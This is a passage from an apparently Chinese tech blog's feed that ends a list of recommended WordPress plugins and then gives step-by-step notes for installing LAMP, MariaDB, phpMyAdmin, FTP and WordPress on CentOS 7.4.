（文章评分器）</font></h2><p>当你所使用的站点主题不能<strong>对每篇文章的进行单独打分</strong>时，此插件可以补全此功能。</p><p><img src="./11.png"></p><h2 id="Enhanced-Text-Widget-（文本小工具强化插件）"><a href="#Enhanced-Text-Widget-（文本小工具强化插件）" class="headerlink" title="Enhanced Text Widget （文本小工具强化插件）"></a><font color="red">Enhanced Text Widget （文本小工具强化插件）</font></h2><p>此插件功能与WordPress自带的小工具【自定义HTML】类似。</p><p>不过此插件<strong>支持PHP代码</strong>，在编写小工具的时候更灵活。</p><p><img src="./12.png"></p><h2 id="Pinyin-Permalinks-（拼音链接）"><a href="#Pinyin-Permalinks-（拼音链接）" class="headerlink" title="Pinyin Permalinks （拼音链接）"></a><font color="red">Pinyin Permalinks （拼音链接）</font></h2><p>WordPress在新建页面/文章的时候，默认会使用标题作为固有链接，但是如果标题含中文或其他特殊字符，会引起页面无法访问的问题。</p><p>此插件会<strong>自动把非英文字符自动转换</strong>（可配置只转换成首字母而非全拼）</p><p><img src="./13.png"></p><p>不过个人更倾向使用<strong>原生的自定义固有链接</strong>，使用文章ID更好看：</p><p><img src="./14.png"></p><h2 id="WP-Real-Media-Library-（媒体库管理器）"><a href="#WP-Real-Media-Library-（媒体库管理器）" class="headerlink" title="WP Real Media Library （媒体库管理器）"></a><font color="red">WP Real Media Library （媒体库管理器）</font></h2><p>此插件可以<strong>对上传的附件进行自定义分类</strong>，而不必都放到一个文件夹内。</p><p><img src="./15.png"></p><h2 id="WPide-（WP在线代码编辑器）"><a href="#WPide-（WP在线代码编辑器）" class="headerlink" title="WPide （WP在线代码编辑器）"></a><font color="red">WPide （WP在线代码编辑器）</font></h2><p>此插件可在HTTP前端的WordPress后台直接编辑主题、插件代码。</p><p>若你租用的只是建站主机而非云服务器，无法登陆操作系统后台，那么这款插件就很适用了（即使可以登陆操作系统后台，这款插件也可以很方便地在页面修改主题、插件代码）。</p><p><strong>特色</strong>：</p><ul><li>① 支持代码高亮</li><li>② 支持行号显示</li><li>③ 支持语法校验</li><li>④ 支持层级目录架构管理</li></ul><p><img src="./16.png"></p><h2 id="Batch-Cat-（文章分类批量修改器）"><a href="#Batch-Cat-（文章分类批量修改器）" class="headerlink" title="Batch Cat （文章分类批量修改器）"></a><font color="red">Batch Cat （文章分类批量修改器）</font></h2><p>强迫者的福音，当你网站的文章非常多，需要重新整理分类的时候，就用得着了。平时不用的时候可以不启用此插件。</p><p>这个插件是直接修改数据库的，比WordPress自带的批量更新文章要强大。而且WordPress原生的批量更新有个BUG，只能加批量分类，无法批量删分类。</p><p><strong>特色</strong>：</p><ul><li>① 支持批量添加文章分类</li><li>② 支持批量修改文章分类</li><li>③ 支持批量删除文章分类</li></ul><p><img src="./17.png"></p><h2 id="WP-Clean-Up-Optimizer-（数据库清理优化器）"><a href="#WP-Clean-Up-Optimizer-（数据库清理优化器）" class="headerlink" title="WP Clean Up Optimizer （数据库清理优化器）"></a><font color="red"><del>WP Clean Up Optimizer （数据库清理优化器）</del></font></h2><p>由于WordPress每次更新文章，都会复制一个文章副本版本，严重浪费数据库资源。</p><p>此插件可在HTTP前端的WordPress后台优化、清理数据库垃圾。</p><p>若你租用的只是建站主机而非云服务器，无法登陆操作系统后台数据库，那么这款插件就很适用了（即使可以登陆操作系统后台数据库，这款插件也可以避免在数据库的误操作）。</p><p><strong>特色</strong>：</p><ul><li>① 支持手动清理数据库垃圾</li><li>② 支持计划/定时清理数据库垃圾</li><li>③ 支持数据库优化</li><li>④ 可避免误删数据库数据</li></ul><blockquote><p><strong><em>注：</em></strong><br><br> <em>这个插件有一个严重的BUG，它会自动记录所有最近尝试登陆的行为到<code>wp_clean_up_optimizer_meta</code> 表</em><br><br> <em>而每次打开WP前台/后台时，它都会第一时间去查这张表</em><br><br> <em>而这张表随着时间推移会越来越大，直接导致的问题就是打开WP站点时 TTFB 越来越长（即页面很久才显示）</em><br><br> <em>实测当这张表有4000条数据时，页面打开时间已经高达6秒以上</em><br><br> <em>因此<font color="red">建议平时将此插件停用，仅才清理时才启用</font></em></p></blockquote><p><img src="./18.png"></p><h2 id="WP-Database-Backup-（WP数据库备份）"><a href="#WP-Database-Backup-（WP数据库备份）" class="headerlink" title="WP Database Backup （WP数据库备份）"></a><font color="red">WP Database Backup （WP数据库备份）</font></h2><p>用于自动备份WP数据库的插件，方便易用。</p><p><strong>特色</strong>：</p><ul><li>① 支持周期备份</li><li>② 支持控制备份数量</li><li>③ 支持在线恢复备份</li><li>④ 支持备份下载</li><li>⑤ 支持备份通知</li></ul><p><img src="./19.png"></p><h2 id="Limit-Login-Attempts-Reloaded-（限制登录重试插件）"><a href="#Limit-Login-Attempts-Reloaded-（限制登录重试插件）" class="headerlink" title="Limit Login Attempts Reloaded （限制登录重试插件）"></a><font color="red">Limit Login Attempts Reloaded （限制登录重试插件）</font></h2><p>当WordPress站点上线一段时间后，你会发现开始有那么一堆（对的不是几个是一堆）机器人在试图通过admin、administrator、或者你的域名去登录你的WordPress后台：</p><p><img src="./20.png"></p><p>先不论你的站点密码有多强悍，单是这种无耻的暴力破解密码行为就会给站点服务器带来额外负担。</p><p>这个时候这个插件就很有用了，它可以设定允许重试多少次登陆密码，超过次数就对IP进行冻结，甚至永久封印：</p><p><img src="./21.png"></p><h2 id="Stealth-Login-Page-（隐形登陆插件）"><a href="#Stealth-Login-Page-（隐形登陆插件）" class="headerlink" title="Stealth Login Page （隐形登陆插件）"></a><font color="red">Stealth Login Page （隐形登陆插件）</font></h2><p>为登陆页面增加验证码，当验证码输入错误时，跳转到指定页面。</p><p>配合前一个插件 Limit Login Attempts Reloaded 一起使用可有效防止机器人暴力破解站点密码：</p><p><img src="./22.png"></p><p><img src="./23.png"></p><h2 id="WP-Ban-（访问限制插件）"><a href="#WP-Ban-（访问限制插件）" class="headerlink" title="WP Ban （访问限制插件）"></a><font color="red">WP Ban （访问限制插件）</font></h2><p>可以很方便地为你的站点设置一个黑名单列表，禁止机器人、非法用户的访问。</p><p><strong>特色</strong>：</p><ul><li>① 支持IP封禁</li><li>② 支持IP段封禁</li><li>③ 支持IP范围封禁</li><li>④ 支持主机封禁</li><li>⑤ 支持域名封禁</li><li>⑥ 支持User Agent封禁（防爬虫）</li></ul><p><img src="./24.png"></p><h2 id="Akismet-Anti-Spam-（防垃圾评论插件）"><a href="#Akismet-Anti-Spam-（防垃圾评论插件）" class="headerlink" title="Akismet Anti-Spam （防垃圾评论插件）"></a><font color="red">Akismet Anti-Spam （防垃圾评论插件）</font></h2><p>WordPress自带的<strong>评论过滤插件</strong>，可以防止机器人灌水、放外链，非常强大。</p><p>个人用户是可以免费使用的，在官方页面获取时拖动价格条到最左边即可，如下图：</p><p><img src="./25.png"></p><h2 id="WP-Super-Cache-（静态页面缓存）"><a href="#WP-Super-Cache-（静态页面缓存）" class="headerlink" title="WP Super Cache （静态页面缓存）"></a><font color="red">WP Super Cache （静态页面缓存）</font></h2><p>此插件的作用是生成<strong>静态页面缓存</strong>，可<strong>加速站点访问</strong>。</p><p>对于一般的站点来说（例如WordPress博客），如果不是刚需，这个插件用于缓存加速是够用的，方便且暴力。</p><h2 id="Redis-Object-Cache-（Redis动态对象缓存）"><a href="#Redis-Object-Cache-（Redis动态对象缓存）" class="headerlink" title="Redis Object Cache （Redis动态对象缓存）"></a><font color="red">Redis Object Cache （Redis动态对象缓存）</font></h2><p>此插件的作用是生成<strong>动态对象缓存</strong>，可<strong>加速站点访问</strong>。</p><p>相比静态缓存的部署要复杂，主要适用于那些经常需要动用数据库查询的站点（例如WordPress论坛）。具体部署方法可参看<a href="%E5%8A%A0%E9%80%9F%E8%AE%BF%E9%97%AEWordPress.html">《加速访问WordPress：Redis部署笔记》</a>。</p><h2 id="Baidu-Sitemap-Generator-（百度站点地图生成器）"><a href="#Baidu-Sitemap-Generator-（百度站点地图生成器）" class="headerlink" title="Baidu Sitemap Generator （百度站点地图生成器）"></a><font color="red">Baidu Sitemap Generator （百度站点地图生成器）</font></h2><p>每个站点都必备一个站点地图Sitemap，有站点地图会更容易被搜索引擎收录站点内容（当然robots.txt协议文件也很重要）。</p><p>可以生成站点地图的插件很多，但是如果是中文站点，推荐还是使用百度，毕竟百度是全球最大的中文搜索引擎，使用此插件更易于被百度蜘蛛收录。</p><p><strong>特色</strong>：</p><ul><li>① 支持生成xml格式站点地图</li><li>② 支持生成html格式站点地图</li><li>③ 随着站点更新，可以同步生成站点地图</li></ul><p><img src="./26.png"></p><p><img src="./27.png"></p><h2 id="Baidu-Links-Submit-（百度链接提交插件）"><a href="#Baidu-Links-Submit-（百度链接提交插件）" class="headerlink" title="Baidu Links Submit （百度链接提交插件）"></a><font color="red">Baidu Links Submit （百度链接提交插件）</font></h2><p>相对站点地图Sitemap的<strong>被动</strong>收录而言，此插件可以<strong>主动</strong>向百度实时提交网站的新链接，使其被百度搜索引擎及时收录，需注册 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 配合使用。</p><p>插件最初来源于 <a href="http://bbs.zhanzhang.baidu.com/thread-28753-1-1.html">百度站长论坛</a>，但是因为原版主在2015年已停更，后来百度站长平台又升级了、加之插件本身也有几个BUG，最后导致无法使用了。</p><p>鉴于我比较喜欢这个插件的风格，因此我把2015版本的BUG修正后，重新发布了这个2018修正版：</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10519791">Baidu Links Submit  v2.0（20180704）下载</a></p></blockquote><p>该插件的原理其实就是封装了 “<strong>百度站长平台-&gt;链接提交-&gt;自动提交-&gt;主动推送（实时）</strong>” 的功能。<font color="red">因此使用了此插件后，原本用于主动实时提交到百度的其他类似功能的插件或JS代码就要删掉了，避免二次提交导致百度翻脸</font>。</p><p><strong>使用方法</strong>请参看<a href="../wp-cha-jian-baidulinkssubmit/">《WP插件：Baidu Links Submit - 实时推送站点链接到百度》</a></p><p><img src="./28.png"></p><h2 id="WP-Content-Copy-Protection-amp-No-Right-Click-（文章保护插件）"><a href="#WP-Content-Copy-Protection-amp-No-Right-Click-（文章保护插件）" class="headerlink" title="WP Content Copy Protection &amp; No Right Click （文章保护插件）"></a><font color="red">WP Content Copy Protection &amp; No Right Click （文章保护插件）</font></h2><p>如果你的站点不希望被别人随意复制内容，那么这个插件就很有用了。不过这个插件会对读者很不友好，需要慎用。</p><p><strong>特色</strong>：</p><ul><li>① JavaScript保护</li><li>② CSS保护</li><li>③ 主页保护</li><li>④ 静态页面保护</li><li>⑤ 禁止右键功能（避免右键复制）</li><li>⑥ 禁止内容选择（避免快捷键复制）</li><li>⑦ 自定义禁止提示语</li></ul><p><img src="./29.png"></p><h2 id="Auto-Add-Copyright-（自动追加站点版权插件）"><a href="#Auto-Add-Copyright-（自动追加站点版权插件）" class="headerlink" title="Auto Add Copyright （自动追加站点版权插件）"></a><font color="red">Auto Add Copyright （自动追加站点版权插件）</font></h2><p>这是本站出品的一个插件，相比于前一个插件（WP Content Copy Protection &amp; No Right Click），这个插件的做法则温和得多，对读者也更友好。</p><p><strong>特色</strong>：</p><ul><li>① 当读者试图复制站点内容时，会自动在复制内容末尾追加站点版权信息</li><li>② 可设置允许读者复制的内容长度，小于这个长度不会触发追加机制</li><li>③ 可设置本插件的生效范围：全站、或仅文章页面</li><li>④ 支持大部分主流浏览器</li><li>⑤ 复制内容支持纯文本、代码等，不会造成复制内容格式变形</li></ul><p>此插件的详细介绍可见<a href="../wp-cha-jian-autoaddcopyright/">《WP插件：Auto Add Copyright – 被复制时自动追加版权链接》</a>。</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10527059">Auto Add Copyright   v1.0（20180707）下载</a></p></blockquote><p><img src="./30.png"></p><h2 id="Insert-Post-Ads-（文章内页广告插件）"><a href="#Insert-Post-Ads-（文章内页广告插件）" class="headerlink" title="Insert Post Ads （文章内页广告插件）"></a><font color="red">Insert Post Ads （文章内页广告插件）</font></h2><p>可以自由定制在文章首部、尾部、中间某个段落后插入一个或多个广告，解决了在编写文章时去才能在文章中间插入广告的问题。</p><p><img src="./31.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> WordPress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP + WordPress 部署笔记</title>
      <link href="/articles/website/wordpress-bu-shu-bi-ji/"/>
      <url>/articles/website/wordpress-bu-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>现在网上虽然有大量WAMP、LAMP、LNMP环境部署的文章，但是不少都过期了或者没有完整的体系、或者没有说明环境版本、再不然就是太罗嗦找不到部署重点。因为环境和版本的各种问题，我在云服务器上面部署的时候碰了不少壁。</p><p>这篇笔记是我在全新安装的、干净的Centos7.4系统的基础下，重复部署了5次<font color="red">LAMP</font>环境之后总结出来的，尽量只罗列出安装环境所用到的每个命令步骤以及说明，不含多余的东西，<font color="red">安装目录也基本使用了默认目录，没有去改动，便于大家复制部署</font>。</p><p>至于WAMP与LNMP不在本文讨论范围内，主要因为WAMP比较简单。而就个人而已，相比于Nginx更习惯Apache，所以最终选了LAMP。</p><h2 id="2-安装软件说明"><a href="#2-安装软件说明" class="headerlink" title="2. 安装软件说明"></a>2. 安装软件说明</h2><table><thead><tr><th align="center">英文缩写</th><th align="center">释义</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">适用平台</td><td align="center">本地物理机/本地虚拟机/云服务器</td><td align="center">本文使用的是 <a href="https://cloud.tencent.com/product/cvm">腾讯云CVM服务器</a></td></tr><tr><td align="center"><del>WAMP</del></td><td align="center"><del>Windows + Apache + Mysql + PHP</del></td><td align="center"><del>Web应用软件集成环境（Window系统）</del></td></tr><tr><td align="center"><del>LNMP</del></td><td align="center"><del>Linux + Nginx + Mysql + PHP</del></td><td align="center"><del>Web应用软件集成环境（Linux系统）</del></td></tr><tr><td align="center">LAMP</td><td align="center">Linux + Apache + Mysql + PHP</td><td align="center">Web应用软件集成环境（Linux系统）</td></tr><tr><td align="center">L</td><td align="center">Linux系统</td><td align="center">本文使用的版本号是Centos 7.4.1708</td></tr><tr><td align="center">A</td><td align="center">Apache</td><td align="center">本文使用的版本号是2.4.6</td></tr><tr><td align="center">M</td><td align="center">MariaDB / Mysql</td><td align="center">本文使用的是MariaDB 5.5.56</td></tr><tr><td align="center">P</td><td align="center">PHP</td><td align="center">本文使用的版本号是5.6.36</td></tr></tbody></table><h3 id="2-1-关于MariaDB数据库"><a href="#2-1-关于MariaDB数据库" class="headerlink" title="2.1. 关于MariaDB数据库"></a>2.1. 关于MariaDB数据库</h3><p>MariaDB是Mysql的分支版本，完全兼容Mysql。</p><p>本文的操作系统是基于Centos 的，Centos 默认使用的就是MarriDB。之所以不使用Mysql，是因为Mysql被Oracle收购后存在闭源风险，因此建议使用MariaDB。</p><h3 id="2-2-关于PHP版本"><a href="#2-2-关于PHP版本" class="headerlink" title="2.2. 关于PHP版本"></a>2.2. 关于PHP版本</h3><p>另外，出于系统安全起见，这里特别提及一下PHP的版本号问题：</p><p>2018年01月22日公布了一个 <strong>CVE-2018-5711: PHP GD库拒绝服务漏洞</strong>：</p><p><a href="https://help.aliyun.com/noticelist/articleid/20788282.html">https://help.aliyun.com/noticelist/articleid/20788282.html</a></p><p>大概意思就是若PHP开启了GD库模块，那么就有可能被一张恶意GIF搞到CPU满荷死机（现在WordPress普遍都会使用timthumb.php对缩略图进行缓存优化以加速网站访问，这个功能会用到GD库）。</p><p><strong>受这个BUG影响的PHP版本</strong>：</p><ul><li>PHP 5 &lt; 5.6.33版本</li><li>PHP 7.0 &lt; 7.0.27版本</li><li>PHP 7.1 &lt; 7.1.13版本</li><li>PHP 7.2 &lt; 7.2.1版本</li></ul><p>这篇文章我使用的是5.6.36版本。之所以没有选择最新的PHP 7.x版本，是因为LAMP环境下，PHP还要安装与之配套版本的phpMyAdmin让PHP访问数据库。而我没有刻意去找与 7.x配套的phpMyAdmin，所以用了5.6.36。其实5.x还是没什么所谓，只要注意不要安装有问题的版本就好。</p><p>顺便一提，<strong>windows环境</strong>还要区分<strong>线程安全版本</strong>和<strong>非线程安全版本</strong>，至于为什么自行百度。但本文说的是<strong>Linux环境，就无需考虑了</strong>。</p><h2 id="3-LAMP环境安装"><a href="#3-LAMP环境安装" class="headerlink" title="3. LAMP环境安装"></a>3. LAMP环境安装</h2><h3 id="3-1-安装操作系统：Linux-CentOS-Linux-release-7-4-1708-Core"><a href="#3-1-安装操作系统：Linux-CentOS-Linux-release-7-4-1708-Core" class="headerlink" title="3.1. 安装操作系统：Linux - CentOS Linux release 7.4.1708 (Core)"></a>3.1. 安装操作系统：Linux - CentOS Linux release 7.4.1708 (Core)</h3><p>操作系统安装过程略，因为无论是在本地物理机、虚拟机，还是在云服务器，都是可以傻瓜式安装，此处就不多言了。</p><p>查看系统版本号:</p><blockquote><p>cat /etc/redhat-release</p></blockquote><p>更新操作系统（可选，建议）：</p><blockquote><p>yum clean all<br>yum -y update</p></blockquote><h3 id="3-2-安装Apache-2-4-6-CentOS"><a href="#3-2-安装Apache-2-4-6-CentOS" class="headerlink" title="3.2. 安装Apache/2.4.6 (CentOS)"></a>3.2. 安装Apache/2.4.6 (CentOS)</h3><p>安装默认Apache：</p><blockquote><p>yum -y install httpd</p></blockquote><p>查看Apache版本号：</p><blockquote><p>apachectl -v</p></blockquote><p>启动Apache：</p><blockquote><p>systemctl start httpd</p></blockquote><p>使得Apache开机启动：</p><blockquote><p>systemctl enable httpd</p></blockquote><p>测试Apache是否安装成功，浏览器打开网址：</p><blockquote><p><a href="http://127.0.0.1/">http://127.0.0.1</a></p></blockquote><p>注意，若打不开，检查下：</p><ul><li>① 防火墙要开放80端口入网规则</li><li>② 若是云服务器IP要改成公网地址</li><li>③ 若是云服务器要配置安全组策略开放80端口</li></ul><p>为WordPress开启mod_rewrite模块功能（用于支持“固定链接”和“站点网络”功能），使用vi打开Apache配置文件：</p><blockquote><p>vi /etc/httpd/conf/httpd.conf</p></blockquote><p>定位到&lt;directory&gt;段修改下列语句，其他部分不用修改。</p><blockquote><p>AllowOverride <strong>None</strong>   修改为  AllowOverride <strong>All</strong></p></blockquote><p>定位到&lt;directory “/var/www”&gt;段修改下列语句，其他部分不用修改。</p><blockquote><p>AllowOverride <strong>None</strong>   修改为  AllowOverride <strong>All</strong></p></blockquote><p>定位到&lt;directory “/var/www/html”&gt;段修改下列语句，其他部分不用修改。</p><blockquote><p>AllowOverride <strong>None</strong>   修改为  AllowOverride <strong>All</strong></p></blockquote><p><strong>至此Apache安装完成</strong>。</p><p><strong>注意</strong>（这些先记下来，不用动，后面有用）：</p><ul><li>① 此时Centos会多了一个<font color="red">用户apache，用户组为apache</font>。</li><li>② Apache的<font color="red">html项目默认路径</font>为：</li></ul><blockquote><p>/var/www/html</p></blockquote><h3 id="3-3-安装MariaDB-5-5-56"><a href="#3-3-安装MariaDB-5-5-56" class="headerlink" title="3.3. 安装MariaDB-5.5.56"></a>3.3. 安装MariaDB-5.5.56</h3><p>安装默认MariaDB：</p><blockquote><p>yum install mariadb-server mariadb</p></blockquote><p>启动MariaDB：</p><blockquote><p>systemctl start mariadb</p></blockquote><p>因首次安装，配置MariaDB：</p><blockquote><p>mysql_secure_installation</p></blockquote><p>此时会问你几个问题：</p><blockquote><p><strong>Enter current password for root (enter for none):</strong><br>　　要求输入root用户当前密码，<strong>由于没有，直接回车不要输入任何东西</strong>，不然不能往下<br><strong>Set root password? [Y/n]</strong><br>　　是否设置root用户密码，<strong>选Y</strong>， 然后自己设置密码就是<br><strong>Remove anonymous users? [Y/n]</strong><br>　　是否移除anonymous 用户，<strong>选Y</strong>，这个用户仅用于测试，在服务器上可能有提权隐患<br><strong>Disallow root login remotely? [Y/n]</strong><br>　　是否禁止root用户远程登录，<strong>选Y</strong>， 为了安全起见，等下再建一个用户用于远程访问就是。<br>　　一般情况下服务器也不应该开放3306端口（除非要迁移数据），容易被攻击。<br><strong>Remove test database and access to it? [Y/n]</strong><br>　　是否移除测试数据库，<strong>选Y</strong>， 没什么用<br><strong>Reload privilege tables now? [Y/n]</strong><br>　　是否重载权限表使所有设置生效，<strong>选Y</strong></p></blockquote><p>使得MariaDB开机启动：</p><blockquote><p>systemctl enable mariadb</p></blockquote><p>连接MariaDB数据库，输入刚才设置的密码：</p><blockquote><p>mysql -u root -p</p></blockquote><p>创建wordpress数据库（后面部署WordPress要用到，记住<font color="red">数据库名wordpress</font>）：</p><blockquote><p>create database <font color="red">wordpress</font>;</p></blockquote><p>建议创建一个WordPress专用的<font color="red">数据库用户wpUser</font> ，而不要用root用户：</p><blockquote><p>create user <font color="red">wpUser</font> identified by '<font color="red">wpPasswd</font>';</p></blockquote><p>授予其wordpress数据库所有权限并可用于远程登陆（但<strong>平时不要开放远程登陆端口</strong>，可通过防火墙或云服务的安全组策略对3306端口进行拦截）：</p><blockquote><p>grant all privileges on <font color="red">wordpress.</font> to '<font color="red">wpUser</font>'@'<font color="red">%</font>' identified by '<font color="red">wpPasswd</font>' with grant option;</p></blockquote><p>刷新权限表使前面设置生效：</p><blockquote><p>flush privileges;</p></blockquote><p>断开数据库连接：</p><blockquote><p>exit;</p></blockquote><p><strong>至此MariaDB安装完成</strong>。</p><h3 id="3-4-安装PHP-5-6-36"><a href="#3-4-安装PHP-5-6-36" class="headerlink" title="3.4. 安装PHP 5.6.36"></a>3.4. 安装PHP 5.6.36</h3><p>由于PHP官网的源可能比较旧（默认是5.4），这里换一个安装源：</p><blockquote><p>rpm -Uvh <a href="https://mirror.webtatic.com/yum/el7/webtatic-release.rpm">https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</a></p></blockquote><p>若报错：<em>epel-release &gt;= 7 is needed by webtatic-release-7-3.noarch</em> , 先安装这个工具（<strong>安装完后重新跑前一个命令</strong>）：</p><blockquote><p>yum -y install epel-release</p></blockquote><p>然后看一下有没有我们要装的PHP版本（所列印表单的第二列就是版本号，若看到PHP 5.6相关组件都是大于5.6.33 版本的，则可以安装）：</p><blockquote><p>yum list php*</p></blockquote><p>安装PHP 5.6的组件（这些模块就是从列表中选的，注意不用加后缀）：</p><blockquote><p>yum install php56w php56w-mysql php56w-gd libjpeg* php56w-ldap php56w-odbc php56w-pear php56w-xml php56w-xmlrpc php56w-mbstring php56w-bcmath </p></blockquote><p>PHP 5.6还要额外安装一个加密组件：</p><blockquote><p>yum groupinstall “development tools”<br>yum -y install mhash mhash-devel mcrypt</p></blockquote><p>另外PHP的配置文件在这里（暂时<strong>不需要动</strong>）：</p><blockquote><p>/etc/php.ini</p></blockquote><p>查看PHP版本号：</p><blockquote><p>php -v</p></blockquote><p><strong>至此PHP安装完成</strong>。</p><h3 id="3-5-安装phpMyAdmin"><a href="#3-5-安装phpMyAdmin" class="headerlink" title="3.5. 安装phpMyAdmin"></a>3.5. 安装phpMyAdmin</h3><p>这个工具是通过web界面管理数据库的（Web版本的数据库客户端工具），依赖于PHP，所以版本要与PHP配套。Centos7自带的phpmyadmin可用于PHP5.x，直接安装就可以了：</p><blockquote><p>yum -y install phpmyadmin</p></blockquote><p>安装完后重启下Apache服务：</p><blockquote><p>systemctl restart httpd.service</p></blockquote><p>测试phpMyAdmin是否安装成功，浏览器打开网址：</p><blockquote><p><a href="http://127.0.0.1/phpMyAdmin/index.php">http://127.0.0.1/phpMyAdmin/index.php</a></p></blockquote><p>注意，若打不开，检查下：</p><ul><li>① 防火墙要开放80、3306端口入网规则</li><li>② 若是云服务器IP要改成公网地址</li><li>③ 若是云服务器要配置安全组策略开放80、3306端口</li><li>④ 若部署在云服务器，不建议放权打开这个地址</li></ul><p>使用vi命令修改phpMyAdmin的配置文件用于连接数据库：</p><blockquote><p>vi /etc/phpMyAdmin config.inc.php</p></blockquote><p>由于使用MariaDB / Mysql数据库，很多选项保持默认值即可，只要把刚才设置的数据库帐密设置进去即可：</p><blockquote><p>$cfg['Servers'][$i]['user'] = '<font color="red">wpUser</font>';<br>cfg['Servers'][$i]['password'] = '<font color="red">wpPasswd</font>';</p></blockquote><p>最后重启下Apache服务：</p><blockquote><p>systemctl restart httpd.service</p></blockquote><p><strong>至此phpMyAdmin安装完成，LAMP环境安装完成</strong>。</p><h3 id="3-6-安装WordPress-4-9-4中文版"><a href="#3-6-安装WordPress-4-9-4中文版" class="headerlink" title="3.6. 安装WordPress 4.9.4中文版"></a>3.6. 安装WordPress 4.9.4中文版</h3><p>由于Centos7的官方源都是英文版，可以去WordPress的官网下载中文版：</p><blockquote><p><a href="https://cn.wordpress.org/txt-download/">https://cn.wordpress.org/txt-download/</a></p></blockquote><p>下载回来后，上传并解压到Apache的html项目目录下：</p><blockquote><p>/var/www/html</p></blockquote><p>上传可使用FTP（后面再说安装步骤），也可使用rz工具（<strong>推荐，更方便</strong>），rz安装命令如下：</p><blockquote><p>yum install lrzsz</p></blockquote><p>上传wordpress压缩包：</p><blockquote><p>rz</p></blockquote><p><strong>上传后，这里有两种处理方式</strong>：</p><ul><li>① 直接解压 wordpress根目录到/var/www/html目录下，以后用于访问wordpress站点的URL为：<a href="http://127.0.0.1/wordpress">http://127.0.0.1/wordpress</a></li><li>② 不要wordpress根目录，只把里面的内容解压到/var/www/html目录下，以后用于访问wordpress站点的URL为：<a href="http://127.0.0.1/">http://127.0.0.1</a></li></ul><p>本文选择的是第 ② 种，因为我只需要部署wordpress一个web项目，而且注册了域名。如果所有URL地址都加了wordpress目录，别人访问麻烦而且丑。</p><p>解压wordpress，并删除wordpress根目录：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip wordpress.zip<span class="token function">mv</span> -r ./wordpress/* <span class="token keyword">.</span><span class="token function">rm</span> -rf wordpress/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如下图所示，此时我的wordpress部署位置是这样的（<strong>直接在/var/www/html目录下，且没有wordpress目录</strong>）：</p><p><img src="./01.png" alt="WordPress安装位置"></p><p>通过确认Apache配置文件/etc/httpd/conf/httpd.conf，可以发现这两个配置项：</p><blockquote><p>user apache<br>group apache</p></blockquote><p>说明WordPress以后会以apache用户在/var/www目录下进行读写操作，因此为了避免因为权限问题导致读写失败，需修改目录权限。</p><p>设置http根目录/var/www的所有组为apache：</p><blockquote><p>chown -R :apache /var/www</p></blockquote><p>设置http根目录/var/www的所有者为apache：</p><blockquote><p>chown -R apache /var/www</p></blockquote><p>设置http根目录/var/www的所有组下所有用户具有读写权限：</p><blockquote><p>chmod -R 775 /var/www</p></blockquote><h3 id="3-7-安装FTP"><a href="#3-7-安装FTP" class="headerlink" title="3.7. 安装FTP"></a>3.7. 安装FTP</h3><p>一般情况下，到这里为止WordPress就不会因为权限问题、因为无法读写/var/www目录，导致无法升级安装主题、插件。</p><p>但如果WordPress还是提示需要FTP进行安装升级，可以继续加一个FTP用户。</p><p>安装FTP服务：</p><blockquote><p>yum install -y vsftpd</p></blockquote><p>启动FTP：</p><blockquote><p>systemctl start vsftpd.service</p></blockquote><p>使得FTP开机启动：</p><blockquote><p>systemctl enable vsftpd.service</p></blockquote><p>为了安全起见，取消FTP匿名登录：</p><blockquote><p>vi /etc/vsftpd/vsftpd.conf<br><em>把第一行的 anonymous_enable=YES ，修改为NO</em></p></blockquote><p>如果这里图方便，可以为root用户开放FTP权限，<strong>编辑这两个文件，用#注释root</strong>即可（<font color="red">但是如果是在云服务器，不建议这么做</font>）：</p><blockquote><p>vi /etc/vsftpd ftpusers<br>vi /etc/vsftpd user_list</p></blockquote><p>添加一个Apache专用的FTP<font color="red">用户apacheftp</font>：</p><blockquote><p>adduser -d /var/www -g apache -s /sbin/nologin <font color="red">apacheftp</font><br><em>命令解析：使用命令(adduser)添加apacheftp用户，不能登录系统(-s /sbin/nologin)，用户文件夹在(-d /var/www)，属于组apache(-g apache)</em></p></blockquote><p>若出现这个提示，不用管：</p><blockquote><p>adduser: warning: the home directory already exists.<br>ot copying any file from skel directory into it.</p></blockquote><p>设置<font color="red">apacheftp</font>用户密码：</p><blockquote><p>passwd <font color="red">apacheftp</font></p></blockquote><p>添加用户<font color="red">apacheftp</font>到ftp用户组， 这样apacheftp就同时属于ftp和apache两个组：</p><blockquote><p>usermod -a -G ftp <font color="red">apacheftp</font></p></blockquote><p>重启FTP服务：</p><blockquote><p>systemctl restart vsftpd.service</p></blockquote><p>最后打开浏览器：<a href="http://127.0.0.1/">http://127.0.0.1</a> ，就可以开始配置Wordpress了。</p><p>初始安装会在页面要求设置数据库的库名、帐密，设置为前文设置的值即可。</p><p>若以后需要更改数据库配置，可在 <strong>/var/www/html/wp-config.php</strong>　中进行修改。</p><p><strong>至此WordPress安装完成</strong>。</p><h3 id="3-8-可选：安装防火墙firewalld"><a href="#3-8-可选：安装防火墙firewalld" class="headerlink" title="3.8. 可选：安装防火墙firewalld"></a>3.8. 可选：安装防火墙firewalld</h3><p>服务器上为了安全起见，建议打开防火墙，Centos默认已安装好firewalld，但处于关闭状态。</p><p>查看防火墙状态：</p><blockquote><p>firewall-cmd --state</p></blockquote><p>开启防火墙：</p><blockquote><p>systemctl start firewalld</p></blockquote><p>永久放开HTTP 80端口、FTP服务（含20/21端口）、远程登录 22端口、Telnet 23端口：</p><blockquote><p>firewall-cmd --add-port=80/tcp --permanent<br>firewall-cmd --add-service=ftp 